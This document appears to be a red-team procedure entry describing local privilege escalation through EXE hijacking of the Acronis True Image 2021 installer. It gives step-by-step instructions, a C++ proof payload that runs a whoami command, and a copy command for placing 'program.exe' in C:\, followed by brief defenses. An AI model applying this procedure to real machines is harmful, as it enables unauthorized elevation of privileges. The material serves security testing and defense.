---
id: proc-acronis-place-exe
tags:
  - exe-hijacking
  - privilege-escalation
  - execution
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Path Interception by PATH Environment Variable]]'
updated_at: '2025-12-14T17:28:51.489Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Path Interception by PATH Environment Variable]]'
---
# Place-Malicious-EXE-in-Root-Directory

## Summary

This procedure exploits the identified hijacking path by placing a malicious 'program.exe' in C:\, causing the Acronis installer to execute it with elevated privileges for local privilege escalation.

## Description

After confirming the path via monitoring, an attacker with write access to C:\ (or chained vuln) copies a crafted malicious executable to 'C:\program.exe'. Relaunching the installer triggers its execution as the process runs elevated. The payload could spawn a shell, inject code, or persist, targeting Windows environments where installers are commonly run as admin.

## Requirements

1. Write access to C:\ root (admin or chained exploit).
2. Compiled malicious EXE (e.g., via Visual Studio: simple C++ app showing MessageBox or spawning cmd.exe).
3. Acronis installer ready for re-execution.

## Defense

Defensive measures and detection strategies:

- Restrict write permissions on C:\ to prevent unauthorized EXE placement.
- Scan root directories for unexpected executables before running installers.
- Employ UAC and run installers in sandboxed environments.

## Objectives

1. Deploy the hijacking payload in the vulnerable path.
2. Trigger execution via installer for elevated code run.
3. Achieve LPE, such as spawning an admin shell.

## Instructions

### Step 1: Create or Obtain Malicious EXE

**Context**: Prepare a payload that demonstrates execution, e.g., a simple EXE popping a message or running a command.

Use a tool like Visual Studio to compile:

Example C++ code:
```cpp
#include <windows.h>
int main() {
    MessageBox(NULL, L"EXE Hijacked!", L"Alert", MB_OK);
    system("cmd.exe /c whoami > C:\\hijack_proof.txt");
    return 0;
}
```
Compile to 'program.exe'.

> Expected output: Standalone 'program.exe' file ready for placement.

### Step 2: Place the EXE in C:\

**Context**: Copy to the root to intercept the installer's search.

Use File Explorer or command prompt:

```cmd
copy program.exe C:\
```

> Expected output: 'program.exe' now in C:\; verify with `dir C:\ /b | find "program.exe"`.

### Step 3: Trigger Execution via Installer

**Context**: Restart installation to cause the hijack.

Run AcronisTrueImage2021.exe as administrator again.

> Expected output: During install, payload executes (e.g., message box appears, proof file created with admin context).

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Execution]] Execution

### Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow
- [[Path Interception by PATH Environment Variable]] Path Interception by Search Order Hijacking

### Sub-Techniques


## Commands Used

- [[commands/copy-file-to-root]]

## Tools Used


## Tags

- [[exe-hijacking]]
- [[privilege-escalation]]
